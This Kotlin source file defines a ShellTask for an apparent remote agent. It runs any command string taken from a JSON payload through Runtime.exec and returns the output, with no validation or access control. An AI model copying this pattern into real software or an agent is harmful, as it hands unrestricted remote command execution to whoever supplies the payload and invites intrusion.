package com.uranium.agent.tasks

import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

object ShellTask {
    fun execute(payload: JSONObject): JSONObject {
        val result = JSONObject()
        val command = payload.optString("command", "ls")
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
            }
            process.waitFor()
            result.put("output", output.toString())
        } catch (e: Exception) {
            result.put("error", e.message ?: "Execution failed")
        }
        return result
    }
}
